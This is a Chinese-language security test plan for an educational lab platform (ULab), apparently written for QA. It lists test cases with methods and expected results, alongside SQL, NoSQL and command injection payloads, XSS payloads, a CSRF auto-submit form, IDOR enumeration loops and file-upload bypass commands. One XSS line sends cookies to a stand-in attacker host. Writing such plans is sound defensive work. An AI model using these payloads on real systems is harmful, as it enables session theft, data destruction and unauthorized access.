🔐 一、认证与授权 (Authentication & Authorization)

1.1 登录安全

#测试项优先级测试方法预期结果
1暴力破解防护P0 使用 Burp Suite Intruder 或脚本对登录接口连续发送 50+ 次错误密码请求，观察响应 连续失败 5-10 次后触发验证码或账号临时锁定；返回 429 状态码
2弱密码策略P0 注册/修改密码时尝试使用 "123456"、"password"、"admin" 等常见弱密码 系统拒绝弱密码，要求至少 8 位、包含大小写字母+数字+特殊字符
3Session 固定攻击P1 登录前获取一个 Session ID，登录后检查 Session ID 是否变更 登录成功后 Session ID 必须重新生成，旧 Session ID 失效
4Session 超时与退出P1 登录后闲置 30 分钟，再操作页面；退出登录后使用浏览器后退按钮 超时后自动跳转登录页；退出后 Session 立即失效，后退无法看到已登录内容
5多设备登录P2 同一账号在 Chrome 和 Safari 同时登录，分别在两个浏览器操作 后登录的设备应使前一个 Session 失效，或明确提示"账号在其他设备登录"

#测试项优先级测试方法预期结果

/create-experiment
/edit-experiment?id=xxx

8水平越权 - 访问他人实验P0 教师 A 登录后，修改 URL 中的实验 ID 为教师 B 的实验 ID，尝试编辑/查看/删除 返回 403 或提示"无权访问该实验"
9水平越权 - 访问他人班级数据P1 教师 A 尝试通过修改班级 ID 参数查看教师 B 班级的学生成绩数据 返回 403 或空数据，不泄露其他教师的学生信息
10未登录直接访问 APIP0 未登录状态下，使用 curl/Postman 直接调用需要认证的 API 接口 所有受保护 API 返回 401 Unauthorized

🗄 二、数据安全 (Data Security)

2.1 注入攻击防护

#测试项优先级测试方法预期结果
11SQL 注入 - 登录表单P0 在用户名输入框输入：
' OR '1'='1' --
admin'--
' UNION SELECT 1,2,3--		 注入语句被过滤或参数化，不返回数据库错误，登录失败
12SQL 注入 - 搜索框P1 在实验搜索框、学生搜索框中输入 SQL 注入 payload 注入无效，正常返回搜索结果或不返回数据
13NoSQL 注入P1 如果使用 MongoDB，在 JSON 接口中注入：
{"$gt": ""}
{"$ne": null}		 输入被校验和过滤，不执行非预期的数据库查询
14命令注入P1 在 Notebook 启动器、文件上传文件名等涉及系统命令的地方注入：
; ls -la
| cat /etc/passwd		 命令注入失败，系统不执行任何 OS 命令

2.2 XSS 跨站脚本

#测试项优先级测试方法预期结果
15存储型 XSS - 实验内容P0 教师在实验标题、节点内容、学习任务配置中输入：
<script>alert('xss')</script>
<img src=x onerror=alert(1)>		 输入被转义或过滤，页面不执行脚本；学生端查看时也不触发
16存储型 XSS - 富文本编辑器P1 在富文本编辑器中切换到 HTML 源码模式，插入 XSS payload，保存后查看 富文本编辑器进行 HTML 净化，危险标签和属性被移除
17反射型 XSS - URL 参数P1 在 URL 参数中注入脚本：
?search=<script>alert(1)</script>
?redirect=javascript:alert(1)		 参数值被正确编码，不在页面中直接渲染为 HTML
18DOM 型 XSSP2 检查前端代码中是否使用 innerHTML、document.write 等危险 API 直接渲染用户输入 使用 textContent 或经过转义后渲染；避免直接拼接用户输入到 DOM

2.3 敏感数据保护

#测试项优先级测试方法预期结果
19密码传输加密P0 使用浏览器 DevTools Network 面板抓包，查看登录请求中密码是否明文传输 密码在请求体中应经过加密（如 bcrypt 哈希）或至少通过 HTTPS 传输
20敏感信息泄露 - API 响应P1 检查所有 API 响应中是否包含密码哈希、Token、内部 IP、数据库错误堆栈 API 响应不返回任何敏感信息；错误信息使用通用提示
21敏感信息泄露 - 前端源码P1 查看页面源代码、JS 文件，搜索 "password"、"token"、"secret"、"api_key" 等关键词 前端源码中不存在硬编码的密钥、密码或 Token
22学生数据隔离P0 学生 A 尝试通过修改 API 参数查看学生 B 的实验成绩、答题内容 数据按用户 ID 隔离，无法跨用户访问
# XSS 测试 Payload 集合 # 存储型 XSS <script>alert(document.cookie)</script> <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"> <svg onload=alert(1)> <body onload=alert(1)> # 反射型 XSS（URL 编码后测试） ?q=<script>alert(1)</script> ?redirect=javascript:alert(document.cookie) ?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E # SQL 注入 Payload 集合 ' OR '1'='1 ' OR '1'='1' -- admin'-- ' UNION SELECT NULL-- ' UNION SELECT username,password FROM users-- 1; DROP TABLE users--

🌐 三、接口安全 (API Security)

#测试项优先级测试方法预期结果
23API 认证校验P0 使用无效 Token、过期 Token、空 Token 分别调用所有 API 接口 所有 API 返回 401；错误信息不泄露系统细节
24CSRF 跨站请求伪造P1 构造一个外部 HTML 页面，包含自动提交的表单，目标为 ULab 的创建实验/删除实验接口 请求被 CSRF Token 校验拦截，关键操作需要 CSRF Token 或 SameSite Cookie
25接口限流 (Rate Limiting)P1 使用脚本对同一 API 接口 1 秒内发送 100+ 请求 触发限流，返回 429 Too Many Requests；正常用户不受影响
26HTTP 方法覆盖P2 使用 GET 请求访问仅允许 POST 的接口，使用 PUT/DELETE 尝试未授权操作 不允许的 HTTP 方法返回 405 Method Not Allowed
27批量操作越权P1 在批量删除/修改接口中，修改请求体中的 ID 数组，加入不属于当前用户的实验 ID 批量操作仅对当前用户有权限的资源生效，无权限的资源被跳过或返回错误
28参数篡改 - IDORP0 遍历实验 ID、学生 ID、文件 ID 等参数，尝试访问不属当前用户的资源 所有资源访问都校验归属关系，返回 403
# CSRF 测试：构造恶意页面 <html> <body> <form action="https://ulabdev.tongshike.cn/api/experiment/delete" method="POST"> <input type="hidden" name="id" value="目标实验ID"> </form> <script>document.forms[0].submit();</script> </body> </html> # 接口限流测试 for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" \ "https://ulabdev.tongshike.cn/api/experiments" \ -H "Authorization: Bearer TOKEN" done # 预期：前 N 次返回 200，之后返回 429 # IDOR 测试 - 遍历实验 ID for id in {1..100}; do curl -s -w "ID=$id Status=%{http_code}\n" \ "https://ulabdev.tongshike.cn/api/experiment/$id" \ -H "Authorization: Bearer 学生TOKEN" done # 预期：所有请求返回 403（学生无权访问编辑接口）

📁 四、文件上传安全 (File Upload Security)

#测试项优先级测试方法预期结果
29文件类型白名单P0 尝试上传以下文件类型：
.exe, .sh, .php, .jsp, .html, .svg, .xml, .js		 非白名单类型被拒绝，仅允许 pdf/doc/ppt/xls/jpg/png/mp4 等
30文件扩展名绕过P1 将 .php 文件改名为 shell.php.jpg、shell.jpg.php、shell.php%00.jpg 后上传 服务端校验文件真实 MIME 类型（魔数），而非仅依赖扩展名
31文件大小限制P1 上传超大文件（如 500MB+ 的压缩包），观察服务器响应 前端+后端双重校验文件大小；超过限制返回 413，不给服务器造成压力
32恶意文件内容检测P1 上传包含病毒签名的文件（EICAR 测试文件）、包含恶意宏的 Office 文档 如有病毒扫描，应拦截恶意文件；建议集成 ClamAV 或类似扫描服务
33文件名路径遍历P1 上传文件名设置为：
../../../etc/passwd
..\..\windows\system32\config\sam		 文件名被规范化处理，路径遍历字符被过滤或替换
34压缩包炸弹P2 上传一个 1KB 的 zip 文件，解压后膨胀为 10GB+ 限制解压后总大小，超过限制拒绝处理
# 生成 EICAR 测试病毒文件 echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.com # 文件扩展名绕过测试 cp shell.php shell.php.jpg cp shell.php shell.jpg.php curl -X POST "https://ulabdev.tongshike.cn/api/upload" \ -F "file=@shell.php.jpg" \ -H "Authorization: Bearer TOKEN" # 预期：服务端检测到真实类型为 PHP，拒绝上传

🖥 五、前端安全 (Frontend Security)

#测试项优先级测试方法预期结果
35CSP 内容安全策略P1 检查 HTTP 响应头中的 Content-Security-Policy 配置 应设置合理的 CSP 策略：限制 script-src、禁止 inline script、限制 connect-src
36Cookie 安全属性P1 检查 Set-Cookie 响应头，验证是否包含 HttpOnly、Secure、SameSite 属性 Session Cookie 设置 HttpOnly（防 XSS 窃取）、Secure（仅 HTTPS）、SameSite=Lax
37localStorage Token 安全P1 检查浏览器 localStorage/sessionStorage 中是否存储了敏感 Token 或密码 Token 优先使用 HttpOnly Cookie；如必须存 localStorage，确认无 XSS 漏洞
38第三方依赖漏洞P2 运行 npm audit 检查前端依赖的已知漏洞 无高危漏洞；定期更新依赖版本
39Iframe 嵌入防护P2 尝试将 ULab 页面嵌入到外部 iframe 中 应设置 X-Frame-Options: DENY 或 SAMEORIGIN，防止点击劫持
# 检查安全响应头 curl -sI https://ulabdev.tongshike.cn | grep -iE \ "content-security-policy|x-frame-options|x-content-type|strict-transport|set-cookie" # 预期看到的安全响应头： Content-Security-Policy: default-src 'self'; script-src 'self'; ... X-Frame-Options: DENY X-Content-Type-Options: nosniff Strict-Transport-Security: max-age=31536000; includeSubDomains Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Lax

🏗 八、基础设施安全 (Infrastructure Security)

#测试项优先级测试方法预期结果
48HTTPS 强制P0 通过 HTTP 访问网站，检查是否自动跳转到 HTTPS HTTP 自动 301 重定向到 HTTPS；HSTS 头已设置
49TLS 版本与加密套件P1 使用 nmap --script ssl-enum-ciphers 或 testssl.sh 扫描 仅支持 TLS 1.2+；禁用弱加密套件（RC4、3DES）；禁用 SSLv2/SSLv3/TLS 1.0/1.1
50错误页面信息泄露P1 触发 404、500、403 等错误页面，检查是否泄露服务器版本、框架信息、堆栈跟踪 错误页面使用通用提示，不暴露 Nginx/Apache 版本、框架名称、代码路径
51OBS/COS 存储权限P1 检查资源文件（图片、文档、压缩包）的 OBS 存储桶权限；尝试直接访问存储桶 存储桶不公开列出；文件访问使用签名 URL 且有有效期

📋 测试执行建议

第一轮：P0 高优先级（12项）

必须在每次发布前执行，覆盖核心安全风险：

  1. 暴力破解防护
  2. 弱密码策略
  3. 学生越权访问教师功能
  4. 水平越权 - 访问他人实验
  5. 未登录直接访问 API
  6. SQL 注入 - 登录表单
  7. 存储型 XSS - 实验内容
  8. 密码传输加密
  9. 学生数据隔离
  10. API 认证校验
  11. 参数篡改 - IDOR
  12. 文件类型白名单
  13. LMS 跳转 Token 安全
  14. Notebook 沙箱隔离
  15. HTTPS 强制

第二轮：P1 中优先级（18项）

每次大版本发布前执行，覆盖常见安全风险。

第三轮：P2 低优先级（12项）

定期安全审计时执行，覆盖深度安全检测。

⚠️ 重要提醒：所有安全测试必须在测试环境（ulabdev）进行，禁止在生产环境执行破坏性测试。SQL 注入、命令注入等测试可能影响系统稳定性，建议在独立的测试环境或获得授权后进行。
